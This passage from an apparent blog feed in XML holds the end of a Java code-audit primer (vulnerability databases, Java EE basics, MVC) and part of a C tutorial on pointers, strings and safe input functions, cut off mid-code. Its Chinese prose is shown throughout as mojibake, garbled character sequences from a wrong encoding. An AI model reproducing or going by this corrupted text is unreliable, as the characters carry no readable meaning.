href="#å…¬å¼€æ¼æ´å¹³å°" class="headerlink" title="å…¬å¼€æ¼æ´å¹³å°"></a>å…¬å¼€æ¼æ´å¹³å°</h3><p>CVE</p><p>NVD</p><p>CNVD</p><p>CNNVD</p><h2 id="Java-EE-åŸºç¡€çŸ¥è¯†"><a href="#Java-EE-åŸºç¡€çŸ¥è¯†" class="headerlink" title="Java EE åŸºç¡€çŸ¥è¯†"></a>Java EE åŸºç¡€çŸ¥è¯†</h2><h4 id="Java-EE-çš„æ ¸å¿ƒæŠ€æœ¯"><a href="#Java-EE-çš„æ ¸å¿ƒæŠ€æœ¯" class="headerlink" title="Java EE çš„æ ¸å¿ƒæŠ€æœ¯"></a>Java EE çš„æ ¸å¿ƒæŠ€æœ¯</h4><p>Java æ•°æ®åº“è¿æ¥ï¼ˆJDBCï¼‰ï¼šåœ¨ Java è¯­è¨€ä¸­ç”¨æ¥è§„èŒƒå®¢æˆ·ç¨‹åºå¦‚ä½•è®¿é—®æ•°æ®åº“çš„åº”ç”¨ç¨‹åºæ¥å£ï¼Œæä¾›äº†è¯¸å¦‚æŸ¥è¯¢å’Œæ›´æ–°æ•°æ®åº“ä¸­æ•°æ®çš„æ–¹æ³•</p><p>Java å‘½åå’Œç›®å½•æ¥å£ï¼ˆJNDIï¼‰ï¼šJavaçš„ä¸€ä¸ªç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºç•Œé¢ï¼ˆAPIï¼‰ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ç”¨åç§°æ¥è®¿é—®å¯¹è±¡</p><p>ä¼ä¸šçº§ JavaBeanï¼ˆEJBï¼‰ï¼šç”¨æ¥æ„ç­‘ä¼ä¸šçº§åº”ç”¨çš„ã€åœ¨æœåŠ¡å™¨ç«¯å¯è¢«ç®¡ç†çš„ç»„ä»¶</p><p>è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRMIï¼‰ï¼šJava çš„ä¸€ç»„ç”¨æˆ·å¼€å‘åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºçš„ API </p><p>Servletï¼ˆServer Appletï¼‰ï¼šæ˜¯ä½¿ç”¨ java ç¼–å†™çš„æœåŠ¡å™¨ç«¯ç¨‹åºã€‚ç‹­ä¹‰çš„æ˜¯æŒ‡java è¯­è¨€å®ç°çš„ä¸€ä¸ªæ¥å£ï¼Œå¹¿ä¹‰çš„æ˜¯çœŸä»»ä½•å®ç°è¯¥ Servlet æ¥å£çš„ç±»ã€‚å…¶ä¸»è¦ä½œç”¨åœ¨äºäº¤äº’å¼åœ°æµè§ˆå’Œä¿®æ”¹æ•°æ®ï¼Œç”ŸæˆåŠ¨æ€ Web å†…å®¹</p><p>JSPï¼šåŠ¨æ€ç½‘é¡µæŠ€æœ¯æ ‡å‡†ã€‚JSP éƒ¨ç½²äºç½‘ç»œæœåŠ¡å™¨ä¸Šï¼Œå¯ä»¥å“åº”å®¢æˆ·ç«¯å‘é€åœ°è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚å†…å®¹åŠ¨æ€ç”Ÿæˆ HTML XML æˆ–è€…å…¶ä»–æ ¼å¼æ–‡æ¡£åœ° Web ç½‘é¡µï¼Œç„¶åè¿”å›ç»™è¯·æ±‚è€…</p><p>å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆXMLï¼‰ï¼šç”¨äºä¼ è¾“å’Œå­˜å‚¨æ•°æ®åœ°è¯­è¨€</p><p>Java æ¶ˆæ¯æœåŠ¡ï¼ˆJMCï¼‰ï¼šä¸€ä¸ªJava å¹³å°ä¸­å…³äºé¢å‘æ¶ˆæ¯ä¸­é—´ä»¶ï¼ˆMOMï¼‰çš„APIï¼Œç”¨äºåœ¨è¿ä¸ªåº”ç”¨ç¨‹åºä¹‹é—´æˆ–è€…åˆ†å¸ƒå¼ç³»ç»Ÿä¹‹é—´å‘é€æ¶ˆæ¯ï¼Œè¿›è¡Œå¼‚æ­¥é€šä¿¡</p><h4 id="Java-EE-åˆ†å±‚æ¨¡å‹"><a href="#Java-EE-åˆ†å±‚æ¨¡å‹" class="headerlink" title="Java EE åˆ†å±‚æ¨¡å‹"></a>Java EE åˆ†å±‚æ¨¡å‹</h4><p>Java EE åº”ç”¨çš„åˆ†å±‚æ¨¡å‹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ 5 å±‚</p><ul><li>Domain Objectï¼ˆé¢†åŸŸå¯¹è±¡ï¼‰å±‚ï¼šæœ¬å±‚ç”±ä¸€ç³»åˆ— POJOï¼ˆPlain Old Java Objectï¼Œæ™®é€šçš„ï¼Œä¼ ç»Ÿçš„javaå¯¹è±¡ï¼‰ç»„æˆï¼Œè¿™äº›å¯¹è±¡æ˜¯è¯¥ç³»ç»Ÿçš„ Domain Objectï¼Œé€šå¸¸åŒ…å«å„è‡ªæ‰€éœ€å®ç°çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³•</li><li>DAOï¼ˆData Access Object æ•°æ®è®¿é—®å¯¹è±¡ï¼‰å±‚ï¼šæœ¬å±‚ç”±ä¸€ç³»åˆ— DAO ç»„ä»¶ç»„æˆï¼Œè¿™äº›DAO å®ç°äº†å¯¹æ•°æ®çš„åˆ›å»ºã€æŸ¥è¯¢ã€æ›´æ–°å’Œåˆ é™¤ç­‰æ“ä½œ</li><li>Serviceï¼ˆä¸šåŠ¡é€»è¾‘ï¼‰å±‚ï¼šæœ¬å±‚ç”±ä¸€ç³»åˆ—çš„ä¸šåŠ¡é€»è¾‘å¯¹è±¡ç»„æˆï¼Œè¿™äº›ä¸šåŠ¡é€»è¾‘å¯¹è±¡å®ç°äº†ç³»ç»Ÿæ‰€éœ€è¦çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³•</li><li>Controllerï¼ˆæ§åˆ¶å™¨ï¼‰å±‚ï¼šæœ¬å±‚ç”±ä¸€ç³»åˆ—çš„æ§åˆ¶å™¨ç»„æˆï¼Œè¿™äº›æ§åˆ¶å™¨ç”¨äºæ‹¦æˆªç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶è°ƒç”¨ä¸šåŠ¡é€»è¾‘ç»„ä»¶çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³•å»å¤„ç†ç”¨æˆ·è¯·æ±‚ï¼Œç„¶åæ ¹æ®å¤„ç†ç»“æœå‘ä¸åŒçš„ view ç»„ä»¶è½¬å‘</li><li>Viewï¼ˆè¡¨ç°ï¼‰å±‚ï¼šæœ¬å±‚ç”±ä¸€ç³»åˆ—çš„é¡µé¢åŠè§†å›¾ç»„ä»¶ç»„æˆï¼Œè´Ÿè´£æ”¶é›†ç”¨æˆ·è¯·æ±‚ï¼Œå¹¶æ˜¾ç¤ºå¤„ç†åçš„ç»“æœ</li></ul><h4 id="MVCæ¨¡å¼ä¸MVCæ¡†æ¶"><a href="#MVCæ¨¡å¼ä¸MVCæ¡†æ¶" class="headerlink" title="MVCæ¨¡å¼ä¸MVCæ¡†æ¶"></a>MVCæ¨¡å¼ä¸MVCæ¡†æ¶</h4><p>MVC çš„ç›®çš„å°±æ˜¯å°† M å’Œ V å®ç°ä»£ç åˆ†ç¦»ï¼Œåˆ©ç”¨ C ç¡®ä¿ M å’Œ C çš„åŒæ­¥</p><p>Modelï¼šæºå¸¦æ•°æ®çš„å¯¹è±¡æ´» Java POJO å³ä½¿æ¨¡å‹å†…æ•°æ®æ”¹å˜ä¹Ÿå…·æœ‰é€»è¾‘æ¥æ›´æ–°æ§åˆ¶å™¨</p><p>Controllerï¼šè¡¨ç¤ºé€»è¾‘æ§åˆ¶ï¼Œæ§åˆ¶å™¨å¯¹æ¨¡å‹å’Œè§†å›¾éƒ½æœ‰ä½œç”¨ï¼Œæ§åˆ¶æ•°æ®æµå…¥æ¨¡å‹å¯¹è±¡ï¼Œå¹¶åœ¨æ•°æ®æ›´æ”¹æ—¶æ›´æ–°è§†å›¾ï¼Œæ˜¯è§†å›¾å’Œæ¨¡å‹çš„ä¸­é—´å±‚</p><p>Viewï¼šæ¨¡å‹åŒ…å«çš„æ•°æ®çš„å¯è§†åŒ–å±‚</p><p>MVCçš„å·¥ä½œæµç¨‹ï¼šController å±‚æ¥æ”¶ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶å†³å®šåº”è¯¥è°ƒç”¨å“ªä¸ª Model æ¥è¿›è¡Œå¤„ç†ï¼›ç„¶åï¼Œç”± Model ä½¿ç”¨é€»è¾‘å¤„ç†ç”¨æˆ·çš„è¯·æ±‚å¹¶è¿”å›æ•°æ®ï¼Œæœ€å View ç»æ•°æ®å‘ˆç°ä¸ªç”¨æˆ·ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-ä»£ç å®¡è®¡å…¥é—¨&quot;&gt;&lt;a href=&quot;#Java-ä»£ç å®¡è®¡å…¥é—¨&quot; class=&quot;headerlink&quot; title=&quot;Java ä»£ç å®¡è®¡å…¥é—¨&quot;&gt;&lt;/a&gt;Java ä»£ç å®¡è®¡å…¥é—¨&lt;/h1&gt;&lt;h2 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;</summary>
      
    
    
    
    <category term="ç¼–ç¨‹è¯­è¨€" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Web" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Web/"/>
    
    
    <category term="ä»£ç å®¡è®¡" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Cå­¦ä¹ åŸºç¡€</title>
    <link href="http://example.com/2021/09/27/C%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2021/09/27/C%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/</id>
    <published>2021-09-26T16:30:08.000Z</published>
    <updated>2021-10-11T11:52:17.864Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cå­¦ä¹ "><a href="#Cå­¦ä¹ " class="headerlink" title="Cå­¦ä¹ "></a>Cå­¦ä¹ </h1><p>[toc]</p><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><p>ä¸ C++ çš„å‡½æ•°å®šä¹‰å·®ä¸å¤šï¼Œè¿”å›å€¼ç±»å‹ï¼Œå½¢å¼å‚æ•°ï¼Œéœ€è¦æ³¨æ„å½¢å¼å‚æ•°å’Œå®é™…å‚æ•°çš„ç±»å‹ä¸€è‡´æ€§</p><p>ä¸»è°ƒå‚æ•°æŠŠå®ƒçš„å‚æ•°å€¼å­˜å‚¨åœ¨æ ˆåŒºåŸŸï¼Œè¢«è°ƒå‡½æ•°ä»æ ˆåŒºè¯»å–å‚æ•°</p><p>å‡½æ•°çš„é‡è¦æ“ä½œï¼šé€’å½’</p><p>é€’å½’çš„æ¡ä»¶ï¼š</p><ul><li>ä¸€ä¸ªé—®é¢˜å¯åˆ†</li><li>æŠŠé—®é¢˜åˆ†è§£ä¸ºè§„æ¨¡ä¸åŒçš„å­é—®é¢˜</li><li>å­˜åœ¨ä¸­æ­¢æ¡ä»¶</li></ul><p>é€’å½’çš„åŸºæœ¬é—®é¢˜ï¼šæ–æ³¢æ‹‰å¥‘æ•°åˆ—ï¼Œé˜¶ä¹˜ï¼Œæ±‰è¯ºå¡”é—®é¢˜ï¼Œå¿«é€Ÿæ’åºæ³•</p><p>å‡½æ•°çš„è¿”å›ç±»å‹å’Œå½¢å‚åˆ—è¡¨æ„æˆäº†å‡½æ•°çš„ç­¾å</p><h2 id="æŒ‡é’ˆæ•°ç»„"><a href="#æŒ‡é’ˆæ•°ç»„" class="headerlink" title="æŒ‡é’ˆæ•°ç»„"></a>æŒ‡é’ˆæ•°ç»„</h2><blockquote><p>æ•°ç»„æŒ‡é’ˆä¸ C++ ä¹ŸåŸºæœ¬ä¸€æ ·</p></blockquote><p>æŒ‡é’ˆï¼šç”¨äºå­˜å‚¨å˜é‡çš„åœ°å€</p><p>çš„<code>scanf()</code>å‡½æ•°ä¸­å°±ä½¿ç”¨åœ°å€ä½œä¸ºå‚æ•°ï¼Œ<code>&amp;</code> å–åœ°å€ï¼Œ<code>%p</code> è¾“å‡ºåœ°å€çš„è½¬æ¢è¯´æ˜</p><p><code>* </code> å–å‡ºæŒ‡é’ˆæŒ‡å‘åœ°å€çš„å€¼</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920153342073.png" alt="image-20210920153342073"></p><blockquote><p>å‡½æ•°ä¸­ä½¿ç”¨æŒ‡é’ˆä¼ é€’å‚æ•°å¯ä»¥ç›´æ¥ä¿®æ”¹åŸæ¥çš„å€¼ï¼Œæ¯”å¦‚ç›´æ¥ä¿®æ”¹æ•°ç»„å€¼ç­‰</p><p>æŒ‡é’ˆåªèƒ½æŒ‡å‘å£°æ˜ä¸ºç»Ÿä¸€ç±»å‹çš„å‚æ•°çš„åœ°å€</p></blockquote><p>æ•°ç»„æ˜¯ç”±åŒä¸€ç±»å‹çš„å…ƒç´ ç»„æˆ</p><p><strong>æŒ‡é’ˆä¸æ•°ç»„çš„è”åˆä½¿ç”¨</strong></p><p>æ•°ç»„åæ˜¯æ•°ç»„å…ƒç´ çš„é¦–åœ°å€</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> a[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>a = &amp;a[<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠå®ƒèµ‹å€¼ç»™æŒ‡é’ˆï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨æŒ‡é’ˆæ¥æ§åˆ¶æ•°ç»„</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920155310432.png" alt="image-20210920155310432"></p><p><strong>æŒ‡é’ˆä¸å¤šç»´æ•°ç»„</strong></p><p><code>int a[5][3]</code>ï¼Œè¿™é‡Œçš„åœ°å€å€¼æœ‰ç‚¹ç»•ï¼Œæ¢³ç†ä¸€ä¸‹</p><p>a æ˜¯äºŒç»´æ•°ç»„çš„é¦–åœ°å€ï¼Œ<code>a = &amp;a[0]</code> , <code>a[0] == &amp;a[0][0]</code> æ‰€ä»¥ <code>*a == &amp;a[0][0]</code> <code>**a == *&amp;a[0][0]</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920162429971.png" alt="image-20210920162429971"></p><p>æŒ‡é’ˆé…åˆå¤šç»´æ•°ç»„</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920163126063.png" alt="image-20210920163126063"></p><p><strong>å‡½æ•° æ•°ç»„ä¸æŒ‡é’ˆ</strong></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs excel">// å‡½æ•°å£°æ˜<br><span class="hljs-built_in">int</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span> a[], <span class="hljs-built_in">int</span> <span class="hljs-built_in">n</span>)<br><span class="hljs-built_in">int</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span> a[][<span class="hljs-number">4</span>], <span class="hljs-built_in">int</span> <span class="hljs-built_in">n</span>)<br><span class="hljs-built_in">int</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span>* a, <span class="hljs-built_in">int</span> <span class="hljs-built_in">n</span>)<br></code></pre></td></tr></table></figure><p><strong>æŒ‡é’ˆçš„æ“ä½œ</strong></p><ol><li>èµ‹å€¼ï¼šæŠŠåœ°å€èµ‹å€¼ç»™æŒ‡é’ˆ</li><li>è§£å¼•ç”¨ï¼š<code>*</code> å–å‡ºåœ°å€ä¸­ä¿å­˜çš„å€¼</li><li>å–å€ï¼šæŒ‡é’ˆå˜é‡ä¹Ÿæœ‰è‡ªå·±çš„åœ°å€å’Œå€¼</li><li>æŒ‡é’ˆå’Œæ•´æ•°ç›¸åŠ ï¼šå¯ä»¥ä½¿ç”¨+è¿ç®—ç¬¦æŠŠæŒ‡é’ˆä¸æ•´æ•°ç›¸åŠ ï¼Œæˆ–æ•´æ•°ä¸æŒ‡é’ˆ ç›¸åŠ ã€‚æ— è®ºå“ªç§æƒ…å†µï¼Œæ•´æ•°éƒ½ä¼šå’ŒæŒ‡é’ˆæ‰€æŒ‡å‘ç±»å‹çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ ç›¸ä¹˜ï¼Œç„¶åæŠŠç»“æœä¸åˆå§‹åœ°å€ç›¸åŠ </li><li>é€’å¢æŒ‡é’ˆï¼šé€’å¢æŒ‡å‘æ•°ç»„å…ƒç´ çš„æŒ‡é’ˆå¯ä»¥è®©è¯¥æŒ‡é’ˆç§»åŠ¨è‡³æ•°ç»„çš„ä¸‹ä¸€ä¸ª å…ƒç´ </li><li>æŒ‡é’ˆå‡å»ä¸€ä¸ªæ•´æ•°ï¼šå¯ä»¥ä½¿ç”¨-è¿ç®—ç¬¦ä»ä¸€ä¸ªæŒ‡é’ˆä¸­å‡å»ä¸€ä¸ªæ•´æ•°</li><li>æŒ‡é’ˆæ±‚å·®ï¼šè®¡ç®—ä¸¤ä¸ªæŒ‡é’ˆçš„å·®å€¼ï¼ˆä¸¤ä¸ªæŒ‡é’ˆéœ€è¦æŒ‡å‘åŒä¸€ä¸ªæ•°ç»„ï¼Œå·®å€¼å°±ä¸ºæ•°çš„è·ç¦»ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼‰</li><li>æ¯”è¾ƒï¼šä½¿ç”¨å…³ç³»è¿ç®—ç¬¦å¯ä»¥æ¯”è¾ƒä¸¤ä¸ªæŒ‡é’ˆï¼Œå‰ææ˜¯ä¸¤ä¸ªæŒ‡é’ˆæ‰§è¡Œçš„æ•°æ®ç±»å‹ä¸€æ ·</li></ol><blockquote><p>åƒä¸‡ä¸è¦è§£å¼•ç”¨æœªåˆå§‹åŒ–çš„æŒ‡é’ˆ</p></blockquote><p><strong>å˜é•¿æ•°ç»„</strong></p><p>C 99 ä¸­æ”¯æŒè¾¹é•¿æ•°ç»„çš„å£°æ˜ï¼Œå¯ä»¥åæœŸè¾“å…¥ä¸€ä¸ªæ•°æ¥å®šä¹‰æ•°ç»„é•¿åº¦ï¼Œä½†æ˜¯è¿˜æ˜¯ä¹ æƒ¯ç”¨ <code>malloc()</code> æ¥åŠ¨æ€åˆ†é…å†…å­˜æ¯”è¾ƒå¥½ç”¨</p><h3 id="æŒ‡é’ˆå‡½æ•°ä¸å‡½æ•°æŒ‡é’ˆ"><a href="#æŒ‡é’ˆå‡½æ•°ä¸å‡½æ•°æŒ‡é’ˆ" class="headerlink" title="æŒ‡é’ˆå‡½æ•°ä¸å‡½æ•°æŒ‡é’ˆ"></a>æŒ‡é’ˆå‡½æ•°ä¸å‡½æ•°æŒ‡é’ˆ</h3><p>æŒ‡é’ˆå‡½æ•°ï¼šè¿”å›å€¼ä¸ºæŒ‡é’ˆçš„å‡½æ•° <code>int *fun(int x , int y)</code></p><p>å‡½æ•°æŒ‡é’ˆï¼šæŒ‡å‘å‡½æ•°çš„ä¸€ä¸ªæŒ‡é’ˆ</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal">int (*p)(int x, int y)<br>p = <span class="hljs-function"><span class="hljs-keyword">fun</span> æˆ–è€… <span class="hljs-title">p</span></span> = &amp;<span class="hljs-function"><span class="hljs-keyword">fun</span></span><br><span class="hljs-function">ä½¿ç”¨ <span class="hljs-title">p</span></span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) æˆ–è€… (*p)(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>) <br></code></pre></td></tr></table></figure><h2 id="å­—ç¬¦æ“ä½œ"><a href="#å­—ç¬¦æ“ä½œ" class="headerlink" title="å­—ç¬¦æ“ä½œ"></a>å­—ç¬¦æ“ä½œ</h2><h3 id="ç¼“å†²åŒº"><a href="#ç¼“å†²åŒº" class="headerlink" title="ç¼“å†²åŒº"></a>ç¼“å†²åŒº</h3><p>å›æ˜¾ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦å<strong>ç«‹å³é‡å¤æ‰“å°è¯¥å­—ç¬¦</strong> æ˜¯å±äº<strong>æ— ç¼“å†²ï¼ˆæˆ–ç›´æ¥ï¼‰è¾“å…¥</strong>ï¼Œå³æ­£åœ¨ç­‰å¾…çš„ç¨‹åºå¯ç«‹å³ä½¿ç”¨è¾“å…¥çš„å­—ç¬¦</p><p>å¤§éƒ¨åˆ†ç³»ç»Ÿåœ¨ç”¨æˆ·æŒ‰ä¸‹Enteré”®ä¹‹å‰ä¸ä¼šé‡å¤æ‰“å°åˆšè¾“å…¥çš„å­—ç¬¦ï¼Œè¿™ç§è¾“å…¥å½¢å¼å±äºç¼“å†²è¾“å…¥</p><p>ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦è¢«æ”¶é›†å¹¶ä¸”å‚¨å­˜åœ¨ä¸€ä¸ªç§°ä¸ºç¼“å†²åŒºçš„ä¸´æ—¶å­˜å‚¨åŒºåŸŸ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920144846310.png" alt="image-20210920144846310"></p><p>ç¼“å†²åˆ†ä¸ºä¸¤ç±»ï¼š</p><ul><li>å®Œå…¨ç¼“å†²ï¼šç¼“å†²åŒºå¡«æ»¡æ—¶æ‰åˆ·æ–°ç¼“å†²åŒºï¼ˆå†…å®¹å‘é€åˆ°ç›®çš„åœ°ï¼‰ï¼Œé€šå¸¸å‡ºç°åœ¨æ–‡ä»¶è¾“å…¥ä¸­</li><li>è¡Œç¼“å†²ï¼šå‡ºç°æ¢è¡Œç¬¦æ—¶åˆ·æ–°ç¼“å†²åŒºï¼Œé€šå¸¸ç”¨äºé”®ç›˜è¾“å…¥</li></ul><p>å­—ç¬¦ä¸²æ˜¯ä»¥ç©ºå­—ç¬¦ï¼ˆ\0ï¼‰ç»“å°¾çš„charç±»å‹æ•°ç»„</p><p>å­—ç¬¦ä¸²å¸¸é‡ä¹Ÿæ˜¯å­˜å‚¨åœ¨é™æ€å­˜å‚¨åŒº,å¯¹äºé™æ€å­˜å‚¨åŒºï¼Œå…¶ä¸­çš„å˜é‡å¸¸é‡åœ¨ç¨‹åºè¿è¡ŒæœŸé—´ä¼šä¸€ç›´å­˜åœ¨ï¼Œä¸ä¼šé‡Šæ”¾ï¼Œä¸”å˜é‡å¸¸é‡åœ¨å…¶ä¸­åªæœ‰ä¸€ä»½æ‹·è´ï¼Œä¸ä¼šå‡ºç°ç›¸åŒçš„å˜é‡å’Œå¸¸é‡çš„ä¸åŒæ‹·è´ã€‚</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920172036442.png" alt="image-20210920172036442"></p><p>åŒå¼•å·æ‹¬èµ·æ¥çš„å†…å®¹è¡¨ç¤ºæŒ‡å‘è¯¥å­—ç¬¦ä¸²å­˜å‚¨ä½ç½®çš„æŒ‡é’ˆ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920170710328.png" alt="image-20210920170710328"></p><p>æ•°ç»„è·å¾—çš„æ˜¯åŸå§‹å­—ç¬¦ä¸²çš„å‰¯æœ¬</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920172303234.png" alt="image-20210920172303234"></p><p>æ¨èå®šä¹‰ï¼š<code>const char* p = &quot;lcdm123&quot;</code></p><blockquote><p>å­—ç¬¦ä¸²çš„ç»å¤§å¤šæ•°æ“ä½œéƒ½æ˜¯ä¾é æŒ‡é’ˆæ¥å®Œæˆçš„</p></blockquote><h3 id="å­—ç¬¦å‡½æ•°"><a href="#å­—ç¬¦å‡½æ•°" class="headerlink" title="å­—ç¬¦å‡½æ•°"></a>å­—ç¬¦å‡½æ•°</h3><p><strong>getchar()  putchar()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br><span class="hljs-comment">//getchar()å’Œ putchar() æ¯æ¬¡åªå¤„ç†ä¸€ä¸ªå­—ç¬¦</span><br><span class="hljs-keyword">char</span> a;<br>a = getchar();<br><span class="hljs-built_in">putchar</span>(a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920143017458.png" alt="image-20210920143017458"></p><h3 id="å­—ç¬¦ä¸²è¾“å…¥å‡½æ•°"><a href="#å­—ç¬¦ä¸²è¾“å…¥å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²è¾“å…¥å‡½æ•°"></a>å­—ç¬¦ä¸²è¾“å…¥å‡½æ•°</h3><p><strong>gets()</strong></p><p><code>gets()</code>ï¼šè¯»å–æ•´è¡Œè¾“å…¥ï¼Œç›´è‡³é‡åˆ°æ¢è¡Œ ç¬¦ï¼Œç„¶åä¸¢å¼ƒæ¢è¡Œç¬¦ï¼Œå‚¨å­˜å…¶ä½™å­—ç¬¦ï¼Œå¹¶åœ¨è¿™äº›å­—ç¬¦çš„æœ«å°¾æ·»åŠ ä¸€ä¸ªç©ºå­—ç¬¦ ä½¿å…¶æˆä¸ºä¸€ä¸ª C å­—ç¬¦ä¸²</p><blockquote><p>gets() å‡½æ•°æ— æ³•æ£€éªŒèƒ½å¦å®¹çº³è¾“å…¥çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œä¼šé€ æˆç¼“å†²åŒºæº¢å‡º</p></blockquote><p><strong>fgets()</strong></p><p><code>fgets()</code>ï¼šå®ƒé€šè¿‡ç¬¬äºŒä¸ªå‚æ•°æ¥é™åˆ¶è¯»å–å­—ç¬¦æ•°ä»è€Œé¿å…äº†ç¼“å†²åŒºæº¢å‡ºçš„é—®é¢˜ï¼Œä¸“é—¨ç”¨æˆ·å¤„ç†æ–‡ä»¶è¾“å…¥ã€‚<code>fgets()</code> è¯»å–åˆ°ç¬¬äºŒä¸ªå‚æ•°å‡ä¸€å¤„æˆ–è€…æ¢è¡Œç¬¦å¤„åœæ­¢ï¼ˆ<code>fgets()</code> ä¼šæŠŠæ¢è¡Œç¬¦å‚¨å­˜åœ¨å­—ç¬¦ä¸²ä¸­ï¼‰ï¼Œ<code>fgets()</code>å‡½æ•°çš„ç¬¬3 ä¸ªå‚æ•°æŒ‡æ˜è¦è¯»å…¥çš„æ–‡ä»¶ã€‚å¦‚æœè¯»å…¥ä»é”®ç›˜è¾“å…¥çš„æ•°æ®ï¼Œåˆ™ä»¥stdinï¼ˆæ ‡å‡†è¾“å…¥ï¼‰ä½œä¸ºå‚æ•°ï¼Œè¯¥æ ‡è¯†ç¬¦å®šä¹‰åœ¨<code>stdio.h</code>ä¸­</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920174340738.png" alt="image-20210920174340738"></p><blockquote><p><code>fputs() </code>ä¸ä¼šåœ¨æœ«å°¾åŠ æ¢è¡Œç¬¦</p></blockquote><p><strong>gets_s()</strong></p><p>ç›¸æ¯”äº<code>gets()</code> å¢åŠ äº†ä¸€ä¸ªå‚æ•°æ¥é™åˆ¶è¾“å…¥çš„å­—ç¬¦æ•°é‡</p><p><strong>s_gets()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">char</span> * <span class="hljs-title">s_gets</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * st, <span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> * ret_val;<br><span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>ret_val = fgets(st, n, <span class="hljs-built_in">stdin</span>);<br><span class="hljs-keyword">if</span> (ret_val) <span class="hljs-comment">// å³ï¼Œret_val != NULL</span><br>&#123;<br><span class="hljs-keyword">while</span> (st[i] != <span class="hljs-string">&#x27;\n&#x27;</span> &amp;&amp; st[i] != <span class="hljs-string">&#x27;\0&#x27;</span>)<br>i++;<br><span 